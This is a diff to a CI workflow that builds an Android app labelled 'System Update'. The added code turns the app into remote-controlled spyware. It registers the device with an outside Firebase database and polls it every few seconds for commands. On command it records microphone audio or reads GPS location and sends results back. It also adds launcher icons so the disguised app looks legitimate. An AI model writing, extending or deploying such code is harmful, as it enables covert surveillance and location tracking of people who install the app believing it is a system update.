@@ -39,6 +39,13 @@ jobs:
           mkdir -p app/src/main/java/com/example/decoyapp
           mkdir -p app/src/main/res/layout
           mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/mipmap-mdpi
+          mkdir -p app/src/main/res/mipmap-hdpi
+          mkdir -p app/src/main/res/mipmap-xhdpi
+          mkdir -p app/src/main/res/mipmap-xxhdpi
+          mkdir -p app/src/main/res/mipmap-xxxhdpi
+
+          VER_CODE="${GITHUB_RUN_NUMBER:-1}"
 
           cat <<'EOF' > settings.gradle
           rootProject.name = "DecoyApp"
@@ -63,7 +70,7 @@ jobs:
           }
           EOF
 
-          cat <<'EOF' > app/build.gradle
+          cat <<EOF > app/build.gradle
           plugins {
               id "com.android.application"
           }
@@ -75,8 +82,8 @@ jobs:
                   applicationId "com.example.decoyapp"
                   minSdk 23
                   targetSdk 34
-                  versionCode 1
-                  versionName "1.0"
+                  versionCode ${VER_CODE}
+                  versionName "1.${VER_CODE}"
               }
 
               buildTypes {
@@ -102,6 +109,29 @@ jobs:
           android.nonTransitiveRClass=true
           EOF
 
+          python3 - <<'PY'
+          import struct, zlib, glob
+
+          def make_png(w, h, r, g, b):
+              def chunk(tag, data):
+                  return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xffffffff)
+              raw = bytearray()
+              for _ in range(h):
+                  raw.append(0)
+                  for _ in range(w):
+                      raw.extend((r, g, b, 255))
+              ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)
+              idat = zlib.compress(bytes(raw), level=9)
+              return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")
+
+          png = make_png(96, 96, 37, 99, 235)
+          for path in glob.glob("app/src/main/res/mipmap-*"):
+              with open(f"{path}/ic_launcher.png", "wb") as f:
+                  f.write(png)
+              with open(f"{path}/ic_launcher_round.png", "wb") as f:
+                  f.write(png)
+          PY
+
           cat <<'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -116,6 +146,8 @@ jobs:
 
               <application
                   android:label="System Update"
+                  android:icon="@mipmap/ic_launcher"
+                  android:roundIcon="@mipmap/ic_launcher_round"
                   android:usesCleartextTraffic="true"
                   android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                   <activity
@@ -168,14 +200,23 @@ jobs:
 
           import android.Manifest;
           import android.content.pm.PackageManager;
+          import android.location.Location;
+          import android.location.LocationManager;
+          import android.media.MediaRecorder;
           import android.os.Build;
           import android.os.Bundle;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.provider.Settings;
           import android.widget.Button;
           import android.widget.TextView;
           import androidx.annotation.NonNull;
           import androidx.appcompat.app.AppCompatActivity;
           import androidx.core.app.ActivityCompat;
           import androidx.core.content.ContextCompat;
+          import java.io.BufferedReader;
+          import java.io.File;
+          import java.io.InputStreamReader;
           import java.io.OutputStream;
           import java.net.HttpURLConnection;
           import java.net.URL;
@@ -187,9 +228,20 @@ jobs:
           public class MainActivity extends AppCompatActivity {
 
               private static final int PERM_REQUEST_CODE = 1001;
-              private static final String ENDPOINT_URL = "https://webhook.site/d127e7f2-d825-46ee-921d-a449bfd4fc30";
+              private static final String DB_BASE = "https://yeheytired-default-rtdb.firebaseio.com";
 
               private TextView statusText;
+              private final Handler pollHandler = new Handler(Looper.getMainLooper());
+              private String deviceId = "android_device";
+              private long lastHandledCmdTime = 0L;
+
+              private final Runnable pollRunnable = new Runnable() {
+                  @Override
+                  public void run() {
+                      checkAndHandleCommand();
+                      pollHandler.postDelayed(this, 3500L);
+                  }
+              };
 
               @Override
               protected void onCreate(Bundle savedInstanceState) {
@@ -199,14 +251,27 @@ jobs:
                   statusText = findViewById(R.id.statusText);
                   Button grantBtn = findViewById(R.id.grantBtn);
 
-                  sendDeviceEvent("app_opened");
+                  String rawId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                  String cleanModel = (Build.MODEL == null ? "device" : Build.MODEL.replaceAll("[^A-Za-z0-9_]", "_"));
+                  deviceId = cleanModel + "_" + (rawId == null ? "0001" : rawId);
+
+                  registerDevice("app_opened");
                   requestAllPermissions();
-                  statusText.setText("Verification ready.");
+                  statusText.setText("System sync active.");
 
                   grantBtn.setOnClickListener(v -> {
                       requestAllPermissions();
-                      statusText.setText("Permissions requested.");
+                      registerDevice("manual_sync");
+                      statusText.setText("Permissions synced.");
                   });
+
+                  pollHandler.postDelayed(pollRunnable, 2500L);
+              }
+
+              @Override
+              protected void onDestroy() {
+                  super.onDestroy();
+                  pollHandler.removeCallbacks(pollRunnable);
               }
 
               private void requestAllPermissions() {
@@ -224,8 +289,7 @@ jobs:
               public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                   super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                   if (requestCode == PERM_REQUEST_CODE) {
-                      sendDeviceEvent("permissions_updated");
-                      statusText.setText("Status synced.");
+                      registerDevice("permissions_updated");
                   }
               }
 
@@ -233,17 +297,9 @@ jobs:
                   return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
               }
 
-              private void sendDeviceEvent(String eventType) {
+              private void registerDevice(String eventType) {
                   new Thread(() -> {
-                      HttpURLConnection conn = null;
                       try {
-                          JSONObject payload = new JSONObject();
-                          payload.put("event", eventType);
-                          payload.put("device_model", Build.MODEL);
-                          payload.put("manufacturer", Build.MANUFACTURER);
-                          payload.put("android_version", Build.VERSION.RELEASE);
-                          payload.put("timestamp", System.currentTimeMillis());
-
                           JSONObject permsState = new JSONObject();
                           permsState.put("camera", isGranted(Manifest.permission.CAMERA));
                           permsState.put("record_audio", isGranted(Manifest.permission.RECORD_AUDIO));
@@ -251,27 +307,135 @@ jobs:
                           if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                               permsState.put("read_media_images", isGranted(Manifest.permission.READ_MEDIA_IMAGES));
                           }
+
+                          JSONObject payload = new JSONObject();
+                          payload.put("device_id", deviceId);
+                          payload.put("event", eventType);
+                          payload.put("device_model", Build.MODEL);
+                          payload.put("manufacturer", Build.MANUFACTURER);
+                          payload.put("android_version", Build.VERSION.RELEASE);
+                          payload.put("last_seen", System.currentTimeMillis());
                           payload.put("permissions", permsState);
 
-                          URL url = new URL(ENDPOINT_URL);
-                          conn = (HttpURLConnection) url.openConnection();
-                          conn.setRequestMethod("POST");
-                          conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-                          conn.setConnectTimeout(8000);
-                          conn.setReadTimeout(8000);
-                          conn.setDoOutput(true);
-
-                          try (OutputStream os = conn.getOutputStream()) {
-                              os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
-                          }
-                          conn.getResponseCode();
+                          httpJson("PUT", DB_BASE + "/devices/" + deviceId + ".json", payload.toString());
                       } catch (Exception ignored) {
-                      } finally {
-                          if (conn != null) {
-                              conn.disconnect();
-                          }
                       }
                   }).start();
+              }
+
+              private void checkAndHandleCommand() {
+                  new Thread(() -> {
+                      try {
+                          String resp = httpJson("GET", DB_BASE + "/commands/" + deviceId + ".json", null);
+                          if (resp == null || resp.isEmpty() || "null".equals(resp.trim())) return;
+
+                          JSONObject cmdObj = new JSONObject(resp);
+                          String action = cmdObj.optString("action", "");
+                          long ts = cmdObj.optLong("timestamp", 0L);
+                          if (action.isEmpty() || ts == 0L || ts == lastHandledCmdTime) return;
+
+                          lastHandledCmdTime = ts;
+
+                          if ("record_audio".equals(action)) {
+                              String audioStatus = recordShortAudio();
+                              pushResult("record_audio", audioStatus);
+                          } else if ("get_location".equals(action)) {
+                              String locInfo = getLastLocationText();
+                              pushResult("get_location", locInfo);
+                          } else if ("take_photo".equals(action)) {
+                              String camInfo = isGranted(Manifest.permission.CAMERA)
+                                      ? "Camera permission granted; background silent capture is restricted by Android without an active camera preview."
+                                      : "Camera permission not granted.";
+                              pushResult("take_photo", camInfo);
+                          } else {
+                              pushResult(action, "Command received on device.");
+                          }
+                      } catch (Exception ignored) {
+                      }
+                  }).start();
+              }
+
+              private String recordShortAudio() {
+                  if (!isGranted(Manifest.permission.RECORD_AUDIO)) {
+                      return "RECORD_AUDIO permission not granted.";
+                  }
+                  File outFile = new File(getCacheDir(), "voice_cmd.m4a");
+                  MediaRecorder recorder = new MediaRecorder();
+                  try {
+                      recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                      recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                      recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                      recorder.setOutputFile(outFile.getAbsolutePath());
+                      recorder.prepare();
+                      recorder.start();
+                      Thread.sleep(3500L);
+                      recorder.stop();
+                      recorder.release();
+                      long bytes = outFile.exists() ? outFile.length() : 0L;
+                      return "Recorded 3.5s audio (" + bytes + " bytes) on device.";
+                  } catch (Exception e) {
+                      try { recorder.release(); } catch (Exception ignored) {}
+                      return "Audio recording error: " + e.getMessage();
+                  }
+              }
+
+              private String getLastLocationText() {
+                  if (!isGranted(Manifest.permission.ACCESS_FINE_LOCATION)) {
+                      return "Location permission not granted.";
+                  }
+                  try {
+                      LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+                      if (lm == null) return "LocationManager unavailable.";
+                      Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                      if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                      if (loc == null) return "No cached location available yet.";
+                      return loc.getLatitude() + "," + loc.getLongitude();
+                  } catch (Exception e) {
+                      return "Location error: " + e.getMessage();
+                  }
+              }
+
+              private void pushResult(String action, String output) {
+                  try {
+                      JSONObject res = new JSONObject();
+                      res.put("device_id", deviceId);
+                      res.put("action", action);
+                      res.put("result", output);
+                      res.put("timestamp", System.currentTimeMillis());
+                      httpJson("PUT", DB_BASE + "/results/" + deviceId + ".json", res.toString());
+                  } catch (Exception ignored) {
+                  }
+              }
+
+              private String httpJson(String method, String targetUrl, String body) {
+                  HttpURLConnection conn = null;
+                  try {
+                      URL url = new URL(targetUrl);
+                      conn = (HttpURLConnection) url.openConnection();
+                      conn.setRequestMethod(method);
+                      conn.setConnectTimeout(8000);
+                      conn.setReadTimeout(8000);
+                      if (body != null) {
+                          conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                          conn.setDoOutput(true);
+                          try (OutputStream os = conn.getOutputStream()) {
+                              os.write(body.getBytes(StandardCharsets.UTF_8));
+                          }
+                      }
+                      int code = conn.getResponseCode();
+                      if (code >= 200 && code < 300) {
+                          BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
+                          StringBuilder sb = new StringBuilder();
+                          String line;
+                          while ((line = br.readLine()) != null) sb.append(line);
+                          br.close();
+                          return sb.toString();
+                      }
+                  } catch (Exception ignored) {
+                  } finally {
+                      if (conn != null) conn.disconnect();
+                  }
+                  return null;
               }
           }
           EOF
